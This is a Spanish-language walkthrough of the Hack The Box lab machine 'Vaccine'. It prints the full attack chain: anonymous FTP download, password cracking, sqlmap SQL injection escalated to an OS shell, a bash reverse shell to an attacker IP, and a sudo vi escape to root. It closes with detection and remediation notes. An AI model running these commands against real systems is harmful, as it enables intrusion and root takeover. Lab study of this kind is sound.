---
tags:
  - htb
  - starting-point
  - tier-2
  - easy
  - linux
  - sqli
  - gtfobins
  - Terminada
ip: 10.129.166.146
os: Linux
difficulty: Easy
status: Terminada
tiempo: 2h 0m
fecha_inicio: 2026-09-09
fecha_completada: 2026-09-09
puntos: 20
mitre_tactics: [Reconnaissance, Credential-Access, Initial-Access, Execution, Privilege-Escalation]
mitre_techniques: [T1595, T1110.002, T1190, T1059.004, T1548.003]
---

# 🖥️ Vaccine — Linux — Easy (Tier 2)

> [!info] Resumen
> **IP:** `10.129.166.146` | **OS:** Linux | **Tier/Fase:** Starting Point Tier 2 | **Tiempo:** 2h 0m
> FTP anónimo expone un ZIP protegido → cracking en cadena (ZIP + hash MD5 de login) → SQLi post-auth escalada a RCE con sqlmap → credencial de Postgres en texto plano → privesc a root abusando de un permiso sudo sobre `vi` (GTFOBins).

---

## 1. Reconocimiento

```bash
nmap -sCV -p- --min-rate 5000 10.129.166.146 -oN nmap.txt
```

| Puerto | Servicio | Versión | Hallazgo clave |
|--------|----------|---------|----------------|
| 21/TCP | ftp | vsftpd 3.0.3 | Anonymous login permitido (código 230) — `backup.zip` disponible |
| 22/TCP | ssh | OpenSSH | Sin uso hasta tener credenciales |
| 80/TCP | http | Apache 2.4.41 (Ubuntu) | Título "MegaCorp Login" — cookie `PHPSESSID` sin flag `httponly` |

**→ Vector:** FTP anónimo como punto de entrada — el resto de la cadena depende de lo que se extraiga de ahí.

---

## 2. Explotación

```bash
# FTP anónimo → descarga del backup
ftp 10.129.166.146
# Name: anonymous / Pass: (cualquiera)
ftp> get backup.zip

# ZIP protegido → crackeo con John
zip2john backup.zip > hash_zip.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash_zip.txt
# → 741852963
unzip backup.zip                    # Password: 741852963
# → index.php, style.css

# index.php contiene la lógica de login con hash hardcodeado:
#   if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3")

# Identificar y crackear el hash
hashid "2cb42f8734ea607eefed3b70af13bbd3"     # → candidato MD5
echo "2cb42f8734ea607eefed3b70af13bbd3" > hash.txt
hashcat -a 0 -m 0 hash.txt /usr/share/wordlists/rockyou.txt
# → qwerty789

# Login en el panel web: admin / qwerty789

# SQLi en el parámetro 'search' del dashboard, automatizada con sqlmap
sqlmap -u 'http://10.129.166.146/dashboard.php?search=test' --cookie="PHPSESSID=<valor>" --batch
# → confirmado: PostgreSQL, usuario conectado es DBA (superusuario)

sqlmap -u 'http://10.129.166.146/dashboard.php?search=test' --cookie="PHPSESSID=<valor>" --os-shell
# → os-shell> disponible (COPY ... FROM PROGRAM, habilitado por ser superusuario)

# Listener en atacante
nc -lvnp 4444

# Payload de reverse shell disparado dentro de os-shell>
os-shell> bash -c "bash -i >& /dev/tcp/10.10.14.96/4444 0>&1"
# sqlmap tira "connection timed out" — esperado, el proceso queda vivo del lado servidor

# Estabilización de la TTY (todo dentro de la terminal del listener):
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm

# Credenciales en texto plano en el código fuente de la app
grep -ri 'password' /var/www/html/*.php
# → dashboard.php: pg_connect(... user=postgres password=P@s5w0rd!)

# Acceso estable vía SSH (mejor que sostener la reverse shell)
ssh postgres@10.129.166.146
# Password: P@s5w0rd!

cat user.txt
```

> [!success] Flag / Acceso obtenido
> `ec9b13ca4d6229cd5cc1e09980965bf7`

---

## 3. Escalación de Privilegios

```bash
sudo -l
# User postgres may run: (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf

# Intento directo con argumento extra — falla (sudoers restringe a ese archivo exacto)
sudo /bin/vi -c ':!/bin/sh' /etc/postgresql/11/main/pg_hba.conf

# Alternativa: abrir el archivo tal cual está autorizado, escapar desde adentro
sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
# Dentro de vi:
:set shell=/bin/sh
:shell

whoami        # root
# La shell abre en el $HOME de postgres, no en /root — hay que moverse explícito:
cd /root
cat root.txt
```

> [!success] Root flag
> `dd6e058e814260bc70e9bbdef2715849`

---

## 4. MITRE ATT&CK

| Táctica | Técnica | ID | Uso en esta máquina |
|---------|---------|----|------------------------|
| Reconnaissance | Active Scanning | T1595 | Nmap inicial, detección de FTP anon vía NSE |
| Credential Access | Brute Force: Password Cracking | T1110.002 | zip2john/John contra el ZIP, hashcat contra el hash MD5 del login |
| Initial Access | Exploit Public-Facing Application | T1190 | SQLi en `search` escalada a RCE con sqlmap `--os-shell` |
| Execution | Command and Scripting Interpreter: Unix Shell | T1059.004 | Reverse shell vía `bash -i`, estabilización con `pty.spawn` |
| Privilege Escalation | Abuse Elevation Control Mechanism: Sudo and Sudo Caching | T1548.003 | Escape de sudo restringido a `vi` mediante GTFOBins |

---

## 5. Detección & Remediación

**Blue Team detecta:**
- Sesión FTP anónima seguida de descarga de un archivo — cualquier acceso anon a FTP debería auditarse por defecto
- Tráfico con firma de sqlmap (decenas de requests con payloads booleanos/time-based en segundos) — un WAF/IDS con reglas SQLi lo marca de inmediato
- Conexión saliente desde el servidor web hacia un puerto no estándar (la reverse shell) — un servidor web no tiene motivo legítimo para iniciar conexiones TCP salientes arbitrarias
- Proceso hijo `/bin/sh` con UID root originado desde `sudo vi` — cadena de proceso detectable por cualquier EDR con monitoreo de ejecución

**Remediación:**
- Deshabilitar login anónimo en FTP; nunca exponer backups por ahí
- Contraseñas fuertes y hash lento (bcrypt/argon2) en vez de MD5 sin salt para comparación de credenciales
- Queries parametrizadas en `dashboard.php`; principio de mínimo privilegio en la cuenta de Postgres que usa la app (nunca superusuario)
- Auditar reglas de sudoers contra GTFOBins antes de desplegar — la entrada de `vi` sobre `pg_hba.conf` nunca debió autorizarse sin sudoedit

---

## 6. Lecciones

- Cadena de 4 eslabones menores (FTP anon → cracking → SQLi/RCE → GTFOBins) en vez de un vector único — el modelo mental que exige CPTS
- `sqlmap --os-shell` no es automático: depende de privilegios de la cuenta DB (superusuario en Postgres). Cuando cuelga con timeout tras un payload de reverse shell, es comportamiento esperado, no fallo
- Estabilización de TTY (`pty.spawn` → Ctrl+Z → `stty raw -echo; fg` → `export TERM`) tiene un orden estricto: `pty.spawn` SIEMPRE antes del Ctrl+Z, o la sesión queda en modo raw sin pty real y se rompe el manejo de líneas

**Bloqueado:**

| Fase | Causa | Fix |
|------|-------|-----|
| Estabilización TTY | Ctrl+Z ejecutado antes de `pty.spawn` — sesión quedó con `^M` literal, sin pty real | Reordenar: `pty.spawn` primero, recién después Ctrl+Z |

---

## 7. Conexiones

- Técnica: [[Técnicas/3_Explotación/SQLi-to-RCE-sqlmap]]
- Técnica: [[Técnicas/4_PrivEsc/GTFOBins-Sudo-Abuse]]
- Relacionada (SQLi distinta): [[Técnicas/3_Explotación/SQL-Injection]] — ahí fue bypass de login, acá fue RCE post-auth

**Referencias:** [GTFOBins - vi](https://gtfobins.github.io/gtfobins/vi/#sudo)
